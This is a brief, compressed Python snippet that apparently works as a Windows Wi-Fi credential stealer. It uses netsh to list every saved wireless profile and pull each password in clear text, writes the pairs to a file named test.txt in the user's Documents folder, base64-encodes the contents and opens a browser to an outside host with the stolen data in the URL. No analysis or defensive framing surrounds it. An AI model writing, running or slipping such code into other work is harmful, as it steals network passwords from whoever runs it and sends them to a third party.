import os,base64,subprocess,webbrowser
    try:p=subprocess.run(['netsh','wlan','show','profiles'],capture_output=True,text=True).stdout;n=[l.split(':')[1].strip()for l in p.split('\n')if'All User Profile'in l];d=os.path.expanduser('~/Documents/test.txt')
    except:return
    with open(d,'w')as f:
        for name in n:
            try:r=subprocess.run(['netsh','wlan','show','profile',name,'key=clear'],capture_output=True,text=True).stdout;pwd=next((l.split(':')[1].strip()for l in r.split('\n')if'Key Content'in l),'');f.write(f'{name}:{pwd}\n')
            except:pass
    with open(d,'r')as f:c=base64.b64encode(f.read().encode()).decode();webbrowser.open(f'https://jmr8027.dssldrf.net/{c}')
